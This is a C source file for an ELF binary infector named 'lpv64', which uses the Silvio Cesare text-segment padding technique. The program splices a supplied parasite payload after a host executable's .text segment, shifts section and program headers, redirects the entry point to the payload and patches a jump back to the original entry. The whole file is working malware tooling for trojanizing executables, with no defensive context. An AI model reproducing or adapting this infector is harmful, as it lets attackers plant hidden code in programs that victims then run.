#include <stdio.h>
#include <stdlib.h>
#include "elf.h"
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define PAGE_SIZE 0x2000
#define JMP_PATCH_OFFSET 1

int silvio_text_infect(char* host,size_t host_len,char *payload, size_t payload_len, size_t fd_infected);

int main(int argc,char **argv){
    int size_host , size_payload;
	struct stat s;
	
	if(argc != 4){
		printf("[!] Usage ./lpv64 <host> <payload> <host_infected> \n");
		exit(-1);
	}

	int fd_host     = open(argv[1],O_RDONLY);
	int fd_payload  = open(argv[2],O_RDONLY);
	int fd_infected = open(argv[3], O_CREAT | O_WRONLY | O_TRUNC,S_IRUSR|S_IXUSR|S_IWUSR);
	
	fstat(fd_host, &s);
	size_host    = s.st_size;
	
	fstat(fd_payload, &s);
	size_payload = s.st_size;
	
	printf("[+] Host size : %d\n",size_host);
	printf("[+] Parasite size : %d\n",size_payload);

	char *host    = malloc(size_host);
	char *payload = malloc(size_payload);

	read(fd_host,host,size_host);
	read(fd_payload,payload,size_payload);

    silvio_text_infect( host, size_host, payload, size_payload, fd_infected);
	
	free(host);
	free(payload);

    return 0;
}

int silvio_text_infect(char* host,size_t host_len,char *payload, size_t payload_len, size_t fd_infected)
{
	char *infected = malloc(host_len + PAGE_SIZE);

    Elf64_Addr old_e_entry;
    Elf64_Addr o_text_filesz;
    Elf64_Addr parasite_vaddr;
    uint64_t end_of_text;
    uint8_t *mem = (uint8_t *)host;
    uint8_t *parasite = (uint8_t *)payload;

	
	/*
	 * Update e_shoff
	 */
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
    Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
	ehdr->e_shoff += PAGE_SIZE;

    /*
     * Adjust program headers
     */
    for (int i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_X)) { // find .text segment
			o_text_filesz = phdr[i].p_filesz; // old .text section size
			end_of_text = phdr[i].p_offset + phdr[i].p_filesz; // end address of .text section
			
			parasite_vaddr = phdr[i].p_vaddr + o_text_filesz; // malcode start address 
			
			old_e_entry = ehdr->e_entry; // old entry point
			printf("[+] old e_entry : 0x%x \n",old_e_entry);

			ehdr->e_entry = parasite_vaddr; 
			printf("[+] new e_entry : 0x%x \n",ehdr->e_entry);
			
			phdr[i].p_filesz += payload_len;
			phdr[i].p_memsz += payload_len; // len of .text section in virtual memory
			
			for (int j = i + 1; j < ehdr->e_phnum; j++) {
				phdr[j].p_offset += PAGE_SIZE;
			}
			break;
		}
    }

	/*
	 * Adjust section headers
	 */
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_offset > end_of_text) {
        	shdr[i].sh_offset += PAGE_SIZE;
		} else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr) {
        	shdr[i].sh_size += payload_len;
		}
    }

	*(uint32_t *) &payload[JMP_PATCH_OFFSET] = old_e_entry;

	memcpy(infected, host, (size_t) end_of_text);
	memcpy(infected + end_of_text, payload, payload_len);
	memcpy(infected + end_of_text + PAGE_SIZE, host + end_of_text, host_len - end_of_text);

	write(fd_infected, infected, host_len + PAGE_SIZE);
	
	free(infected);

    return 0;

}

